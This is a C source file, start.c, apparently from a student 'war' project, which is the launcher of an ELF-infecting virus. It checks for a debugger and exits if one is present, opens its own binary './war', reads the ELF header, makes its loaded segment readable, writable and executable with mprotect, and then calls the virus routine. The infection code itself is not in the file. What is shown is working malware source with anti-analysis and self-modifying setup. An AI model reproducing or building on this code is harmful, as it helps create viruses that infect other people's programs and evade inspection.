/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   start.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/27 01:45:21 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "accessors.h"
#include "loader.h"
#include "syscall.h"
#include "utils.h"
#include "virus.h"

/*
** _start is the launcher function of the virus
**   - it is launched instead of the loader for the first run
**   - it is NOT copied into infected files (unlike the loader and virus)
**   - it makes the current PT_LOAD writable so that the virus runs under the
**     same conditions as with the loader
*/

void	_start(void)
{
	if (detect_spy())
		sys_exit(putstr("spy detected!\n"));

	struct safe_ptr	launcher_file;
	if (!init_original_safe(&launcher_file, "./war"))
		sys_exit(putstr("failed to create safe accessor for file ./war\n"));

	struct entry		file_info;
	if (!find_entry(&file_info, launcher_file))
		sys_exit(putstr("failed to find entry\n"));

	Elf64_Ehdr		*elf_hdr = safe(launcher_file, 0, sizeof(Elf64_Ehdr));
	if (elf_hdr == NULL)
		sys_exit(putstr("failed to read elf header\n"));

	size_t	p_vaddr         = file_info.safe_phdr->p_vaddr;
	size_t	entry_vaddr     = elf_hdr->e_entry;
	size_t	dist_to_pt_load = entry_vaddr - p_vaddr;

	void	*pt_load_addr = (void *)_start - dist_to_pt_load;
	size_t	pt_load_size  = file_info.safe_phdr->p_memsz;
	int	prot_rwx      = 0x07;

	if (sys_mprotect(pt_load_addr, pt_load_size, prot_rwx) < 0)
		sys_exit(putstr("failed to make current PT_LOAD writable\n"));

	virus();

	sys_exit(0);
	__builtin_unreachable();
}
